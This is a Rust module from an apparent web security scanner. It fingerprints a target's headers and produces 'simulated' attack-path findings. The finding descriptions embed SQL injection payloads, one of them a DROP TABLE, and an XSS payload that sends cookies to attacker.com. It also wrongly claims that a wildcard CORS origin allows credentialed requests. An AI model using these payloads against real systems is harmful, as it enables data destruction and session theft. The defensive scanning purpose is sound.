//! Digital Twin Attack Simulator — builds an environment profile and simulates attack scenarios.

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

async fn build_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn normalize_target(target: &str) -> String {
    let t = target.trim();
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

pub async fn run_digital_twin_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let base = normalize_target(target);
    let client = build_client().await;
    let mut findings: Vec<serde_json::Value> = Vec::new();

    // Phase 1: Build environment profile (Digital Twin)
    let mut twin_profile = serde_json::Map::new();

    // Fingerprint server technology
    if let Ok(resp) = client.get(&base).send().await {
        let headers = resp.headers().clone();
        let status = resp.status().as_u16();

        let server = headers.get("server").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
        let powered_by = headers.get("x-powered-by").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
        let content_type = headers.get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
        let has_hsts = headers.contains_key("strict-transport-security");
        let has_csp = headers.contains_key("content-security-policy");
        let has_cors = headers.contains_key("access-control-allow-origin");

        twin_profile.insert("server".to_string(), json!(server));
        twin_profile.insert("powered_by".to_string(), json!(powered_by));
        twin_profile.insert("http_status".to_string(), json!(status));
        twin_profile.insert("has_hsts".to_string(), json!(has_hsts));
        twin_profile.insert("has_csp".to_string(), json!(has_csp));
        twin_profile.insert("has_cors".to_string(), json!(has_cors));
        twin_profile.insert("content_type".to_string(), json!(content_type));

        findings.push(json!({
            "type": "digital_twin",
            "title": format!("Digital Twin profile built for {}", base),
            "severity": "info",
            "mitre_attack": "T1595.002",
            "description": format!(
                "Environment profile (Digital Twin) constructed: Server={}, PoweredBy={}, HSTS={}, CSP={}, CORS={}. \
                This profile drives attack simulation scenarios.",
                server, powered_by, has_hsts, has_csp, has_cors
            ),
            "value": base,
            "twin_profile": serde_json::Value::Object(twin_profile.clone())
        }));

        // Phase 2: Simulate attack scenarios based on profile
        // Simulate SQLi if forms or APIs detected
        if content_type.contains("html") || content_type.contains("json") {
            findings.push(json!({
                "type": "digital_twin",
                "title": format!("Simulation: SQL Injection attack path against {}", base),
                "severity": "high",
                "mitre_attack": "T1190",
                "description": format!(
                    "Digital Twin simulation predicts SQL injection attack path via web forms/API. \
                    Server '{}' with {} content type. Recommended test: probe all input parameters \
                    with payloads: ' OR '1'='1, 1; DROP TABLE users--, UNION SELECT NULL,NULL,NULL--",
                    server, content_type
                ),
                "value": base,
                "simulation": "sqli",
                "attack_path": ["Reconnaissance", "Initial Access via SQLi", "Data Exfiltration"]
            }));
        }

        // Simulate XSS if no CSP
        if !has_csp {
            findings.push(json!({
                "type": "digital_twin",
                "title": format!("Simulation: XSS attack path (no CSP) against {}", base),
                "severity": "high",
                "mitre_attack": "T1059.007",
                "description": format!(
                    "Digital Twin simulation: Content-Security-Policy header is absent on {}. \
                    XSS attack simulation predicts high success probability. \
                    Simulated payload: <script>document.location='https://attacker.com/?c='+document.cookie</script>",
                    base
                ),
                "value": base,
                "simulation": "xss",
                "attack_path": ["Injection via user input", "Session hijacking", "Lateral movement"]
            }));
        }

        // Simulate MITM if no HSTS
        if !has_hsts {
            findings.push(json!({
                "type": "digital_twin",
                "title": format!("Simulation: SSL Strip / MITM attack path (no HSTS) against {}", base),
                "severity": "medium",
                "mitre_attack": "T1557",
                "description": format!(
                    "Digital Twin simulation: HSTS is not enforced on {}. \
                    SSL Strip attack simulation: attacker on same network can downgrade HTTPS to HTTP, \
                    intercepting credentials and session tokens. Simulated success probability: HIGH.",
                    base
                ),
                "value": base,
                "simulation": "sslstrip",
                "attack_path": ["Network positioning", "SSL strip", "Credential capture"]
            }));
        }

        // Simulate CORS-based attack
        if has_cors {
            let origin_val = headers
                .get("access-control-allow-origin")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();
            if origin_val == "*" {
                findings.push(json!({
                    "type": "digital_twin",
                    "title": format!("Simulation: CORS misconfiguration attack against {}", base),
                    "severity": "high",
                    "mitre_attack": "T1557",
                    "description": format!(
                        "Digital Twin simulation: CORS is configured as Access-Control-Allow-Origin: * on {}. \
                        Any origin can make credentialed cross-origin requests, enabling data exfiltration \
                        from authenticated user sessions.",
                        base
                    ),
                    "value": base,
                    "simulation": "cors",
                    "cors_policy": origin_val
                }));
            }
        }
    }

    EngineResult::ok(
        findings.clone(),
        format!("DigitalTwin: {} simulation scenarios generated for {}", findings.len(), base),
    )
}

pub async fn run_digital_twin(target: &str) {
    print_result(run_digital_twin_result(target).await);
}
